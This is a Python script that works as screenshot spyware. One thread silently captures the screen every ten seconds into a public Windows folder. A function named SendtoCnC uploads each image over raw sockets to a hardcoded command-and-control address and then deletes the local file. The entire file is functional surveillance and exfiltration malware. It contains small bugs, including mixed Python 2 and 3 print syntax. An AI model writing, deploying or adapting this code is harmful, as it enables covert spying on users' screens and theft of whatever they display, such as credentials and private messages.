#General Imports
import os
import time

#pyscreenshot 
import pyscreenshot

#thread
import threading

#socket import
import socket

HOST = '10.16.128.146'
PORT = 9877
ADDR = (HOST,PORT)
BUFSIZE = 4096

UD='C:\\Users\\Public'
#get the files in the directory
def PNGFiles(rdir):
	f=[]
	for root,dirs,files in os.walk(rdir,topdown=False,followlinks=True):
		for name in files:
			if str(name).endswith("png") and "Screenshot_" in str(name):
				f.append(os.path.join(root,name))
	return f

def CaptureScreen():
	while True:
		imagename=UD+'\\'+'Screenshot_'+str(time.time())+'.png'
		try:
			pyscreenshot.grab_to_file(imagename)
		except:
			print("Failed!! Retying!!")
		print("Done")
		time.sleep(10)
		print("Starting again")

def SendtoCnC():
	sentfiles=0
	while True:
		#client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		#client.connect(ADDR)
		#logic for scanning the png file created
		sf=PNGFiles(UD)
		#logic for sending the file to server
		if(sf):
			for pfile in sf:
				#print pfile, " taken"
				x = open(pfile,"rb")
				bytes=x.read(BUFSIZE)
				#print pfile, " sent"
				#Redundant
				client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				client.connect(ADDR)
				while bytes:
					client.send(bytes)
					print("Sending...")
					bytes=x.read(BUFSIZE)
				print("Reached EOF of this file")
				client.close()
				x.close()
				#logic for deleting the file
				os.remove(pfile)
				sentfiles=sentfiles+1
				print("I sent "+ str(sentfiles)+"upto now")
				time.sleep(2)
		else:
			print "No files left, Waiting for files"
			time.sleep(2)
			client.close()

def main():
	try:
		c=threading.Thread(target=CaptureScreen)
		c.daemon=True
		c.start()
		time.sleep(2)
		x=threading.Thread(target=SendtoCnC)
		x.daemon=True
		x.start()
		c.join()
		x.join()
	except KeyboardInterrupt:
		print("Pressed Ctrl+C. Quitting")

if __name__=='__main__':
	main()